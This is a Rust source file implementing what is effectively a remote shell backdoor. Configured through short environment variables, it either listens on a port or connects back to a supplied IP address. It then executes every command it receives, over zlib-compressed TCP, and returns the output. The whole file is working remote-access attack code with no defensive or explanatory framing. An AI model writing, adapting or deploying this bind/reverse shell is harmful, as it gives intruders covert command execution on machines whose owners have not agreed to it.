extern crate mio;
extern crate flate2;


use std::io::Read;
use mio::*;
use mio::net::*;
use flate2::Compression;
use flate2::write::ZlibEncoder;
use flate2::bufread::ZlibDecoder;
use std::collections::HashMap;
use std::io::{BufRead, BufReader, Write, ErrorKind};
use std::net::{Ipv4Addr, Shutdown};
use std::env;
use std::process::{Stdio, Command, exit};

const SERVER_TOKEN: Token = Token(0);

struct ServerConnections {
    clients: HashMap<Token, TcpStream>,
    token_counter: usize,
    sock_listener: TcpListener
}

struct EnvOptions {
    callback: bool,
    ip_address: String,
    port: String
}

fn parse_callback_address() -> String {
    let callback_address = match env::var("I") {
        Ok(r) => r,
        Err(e) => {
            println!("Callback address not specified: {}", e);
            exit(7);
        }
    };

    let _ : Ipv4Addr = match callback_address.parse() {
        Ok(r) => r,
        Err(e) => {
            println!("Invalid callback address {}", e);
            exit(8);
        }
    };

    callback_address
}

fn parse_options() -> EnvOptions {
    let mut env_options = EnvOptions { callback: false, ip_address: String::from("0.0.0.0"), port: String::from("12345") };

    match env::var("C") {
        Ok(_) => env_options.callback = true,
        _ => env_options.callback = false
    }

    if env_options.callback {
        env_options.ip_address = parse_callback_address();
    }

    let port = match env::var("P") {
        Ok(r) => r,
        /* 
         * Add in port number checking here
         */
        Err(e) => {
            println!("Port not specified: {}", e);
            exit(6);
        }
    };
    println!("Port is {}", port);
    env_options.port = port;

    env_options
}

fn execute_command(command_split: Vec<&str>) -> Result<String, std::io::Error> {
    let command_output = Command::new(command_split[0])
                     .stdout(Stdio::piped())
                     .stderr(Stdio::piped())
                     .args(&command_split[1..])
                     .output()?;
    println!("Proc_result: {:?}", command_output);
    println!("Status: {}", command_output.status.success());

    Ok(String::from_utf8_lossy(&command_output.stdout).to_string())
}

fn decompress_buffer(read_buffer: Vec<u8>) -> String {
    println!("Read buf: {:?}", read_buffer);

    let mut decompressor = ZlibDecoder::new(read_buffer.as_slice());
    let mut uncompressed_buffer = String::new();
    decompressor.read_to_string(&mut uncompressed_buffer).unwrap();

    uncompressed_buffer
}

fn command_loop_server(sockets: &mut ServerConnections, poll: &Poll, mut pevents: &mut Events){
    loop {
        poll.poll(&mut pevents, None).unwrap();

        for event in pevents.iter(){
            match event.token(){
                SERVER_TOKEN => {
                    let client_sock = sockets.sock_listener.accept().unwrap();
                    println!("Accepted connection from {:?}", client_sock.0);
                    let new_token = Token(sockets.token_counter);
                    sockets.clients.insert(new_token, client_sock.0);
                    sockets.token_counter += 1;
                    poll.register(&sockets.clients[&new_token], new_token, Ready::readable(), PollOpt::edge()).unwrap();
                }
                token => {
                    println!("Client connection: {:?}", token);
                    let mut client = sockets.clients.get(&token).unwrap();
                    let mut send_client = client.try_clone().unwrap();
                    let mut buffer = [0; 4096];

                    let recv = match client.read(&mut buffer){
                        Ok(r) => r,
                        Err(e) => {
                            println!("Error: {:?}", e.to_string());

                            match e.kind() {
                                ErrorKind::BrokenPipe => {
                                    let _ = client.shutdown(Shutdown::Both);
                                    sockets.token_counter -= 1;
                                    let _ = poll.deregister(client);
                                    println!("Connection reset by peer");
                                    break;
                                }
                                _ => {
                                    println!("Error reading: {:?}", e);
                                }   
                            }
                            continue;

                        }
                    };

                    let mut buffer = buffer.to_vec();
                    buffer.truncate(recv);
                    let mut command = decompress_buffer(buffer);
                    println!("Recv, length {}: {}", recv, command);

                    if command.trim() == "kill" {
                        exit(0);
                    }

                    if command.trim() == "quit" {
                        let _ = client.shutdown(Shutdown::Both);
                        sockets.token_counter -= 1;
                        let _ = poll.deregister(client);
                        println!("[+] Client disconnect...");
                        break;
                    }

                    let comm_split : Vec<&str> = command.split_whitespace().collect();
                    if comm_split.len() == 0 {
                        continue;
                    }

                    let command_output = execute_command(comm_split);

                    let command_output = 
                        if command_output.is_ok() {
                            command_output.unwrap()
                        } else {
                            command_output.unwrap_err().to_string()
                        };

                    let mut e = ZlibEncoder::new(Vec::new(), Compression::best());
                    let _compressed_bytes_len = e.write(command_output.as_bytes()).unwrap();
                    let compressed_bytes = e.finish().unwrap();
                    println!("Compressed len: {}", compressed_bytes.len());
                    println!("Orig len: {}", command_output.len());
                    let _ = send_client.write(&compressed_bytes[..]);

                }
            }
        }
    }
}

fn command_loop_client(poll: Poll, mut pevents: Events, client_sock: &TcpStream){
    loop {
        poll.poll(&mut pevents, None).unwrap();

        let mut send_client = client_sock.try_clone().unwrap();   
        let mut reader = BufReader::new(client_sock);
        let mut command = String::new();
        let read_buf = match reader.read_line(&mut command){
            Ok(r) => r,
            Err(e) => {
                if e.raw_os_error().unwrap() == 104 {
                    println!("Connection reset by peer");
                    exit(104);
                } else {
                    println!("Error reading: {:?}", e);
                    exit(e.raw_os_error().unwrap());
                }
            }
        };

        println!("Recv, Length {}: {}", read_buf, command);

        if command.trim() == "kill" {
            exit(0);
        }

        if command.trim() == "quit" {
            println!("[+] Disconnecting...");
            exit(0);
        }

        let comm_split : Vec<&str> = command.split_whitespace().collect();
        if comm_split.len() == 0 {
            continue;
        }

        println!("Running {:?}", comm_split);
        let command_output = execute_command(comm_split);

        let command_output = 
            if command_output.is_ok() {
                command_output.unwrap()
            } else {
                command_output.unwrap_err().to_string()
            };

        let mut e = ZlibEncoder::new(Vec::new(), Compression::default());
        let _compressed_bytes_len = e.write(command_output.as_bytes()).unwrap();
        let compressed_bytes = e.finish().unwrap();
        println!("Compressed len: {}", compressed_bytes.len());
        println!("Orig len: {}", command_output.len());
        //println!("Sending: {:?}", compressed_bytes);
        let _ = send_client.write(&compressed_bytes[..]);
    }
}

fn main () {
    let poll = Poll::new().unwrap();
    let mut pevents = Events::with_capacity(1024);

    let env_options = parse_options();

    println!("Port: {}, {}, {}", env_options.callback, env_options.ip_address, env_options.port);
    //TODO: Actually check this parse Result
    let addr = (env_options.ip_address + ":" + &env_options.port).parse().unwrap();
    if env_options.callback {
        let sock_cb = match TcpStream::connect(&addr) {
            Ok(r) => r,
            Err(e) => {
                println!("Unable to connect {:?}", e);
                exit(10);
            }
        };

        let client_token = Token(2);
        poll.register(&sock_cb, client_token, Ready::readable(), PollOpt::edge()).unwrap();
        command_loop_client(poll, pevents, &sock_cb);

    } else {
        // Create the listener
        let listener = match TcpListener::bind(&addr) {
            Ok(r) => r,
            Err(e) => {
                if e.raw_os_error().unwrap() == 98 {
                    println!("[-] Port already bound");
                    exit(98);
                }
                println!("Error: {:?}", e);
                exit(2);
            }
        };

        let mut sockets = ServerConnections {
            token_counter: 1,
            clients: HashMap::new(),
            sock_listener: listener
        };
        // Register the listener with `Poll`
        poll.register(&sockets.sock_listener, SERVER_TOKEN, Ready::readable(), PollOpt::edge()).unwrap();
        command_loop_server(&mut sockets, &poll, &mut pevents);
    }
}
